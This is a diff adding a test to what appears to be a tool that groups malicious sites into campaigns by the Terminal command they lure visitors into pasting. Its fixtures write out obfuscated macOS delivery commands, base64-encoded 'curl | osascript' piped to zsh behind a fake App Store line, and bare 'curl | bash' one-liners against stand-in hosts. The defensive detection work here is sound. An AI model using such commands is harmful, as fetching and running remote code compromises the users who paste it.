@@ -460,4 +460,32 @@ describe("a campaign's visitor guidance", () => {
 		expect(other.calls).toMatchObject({ heading: 1, guidance: [] });
 		expect(await describeCampaignIfChanged(unbranded, other.dependencies)).toBe(false);
 	});
+
+	test("sites whose operator rotated the payload host still merge by the command they make visitors paste; a bare one-liner merges nothing (production campaigns 381039143620186610 and 382162112861967223)", async () => {
+		const lure = (host: string, app: string, path: string) =>
+			`Open Terminal and paste:\necho "https://apps.apple.com/app/${app}-install"; echo '${Buffer.from(`curl -sfL https://${host}/${path} | osascript -l JavaScript`).toString("base64")}' | base64 -d | zsh`;
+		const bare = (host: string) => `Run this:\ncurl -fsSL https://${host}/install | bash`;
+		const sites = {
+			a: { submission: website(1n, "macmorrow-test.app"), text: lure("keychainagent-test.pro", "macmorrow", "wksxgj/yX1fQWFGw9rp") },
+			b: { submission: website(2n, "paneo-test.work"), text: lure("keychainagent-test.pro", "paneo", "wksxgj/wZZLR9xY29o4") },
+			c: { submission: website(3n, "macslate-test.app"), text: lure("nodeagent-test.pro", "macslate", "ekgs7q/vjJlEWOTgJXq") },
+			d: { submission: website(4n, "bare-one-test.com"), text: bare("one.example") },
+			e: { submission: website(5n, "bare-two-test.com"), text: bare("two.example") },
+		};
+		await store(...Object.values(sites).map((site) => site.submission));
+		const dependencies = fixtures(sites);
+		for (const id of [1n, 2n, 4n, 5n]) await linkSubmissionToCampaign(id, dependencies);
+		expect(await CampaignRepository.campaignForSubmission(1n)).toBe(await CampaignRepository.campaignForSubmission(2n));
+		// Neither host nor kit links the new site: only the command does.
+		await linkSubmissionToCampaign(3n, dependencies);
+		const [a, b, c, d, e] = await Promise.all([1n, 2n, 3n, 4n, 5n].map((id) => CampaignRepository.campaignForSubmission(id)));
+		expect(new Set([a, b, c]).size).toBe(1);
+		expect(c).toBeDefined();
+		expect(d).not.toBe(e);
+		expect(d).not.toBe(c);
+		const recorded = (await CampaignRepository.listMembers(c!)).find((member) => member.submissionId === 3n)!;
+		expect(recorded.indicators.find((indicator) => indicator.kind === "delivery_command")).toMatchObject({ links: true, evidence: { page: "website.mhtml", interpreters: ["curl", "osascript"] } });
+		const bareIndicator = (await extractIndicators(4n, dependencies)).find((indicator) => indicator.kind === "delivery_command");
+		expect(bareIndicator).toMatchObject({ links: false });
+	});
 });
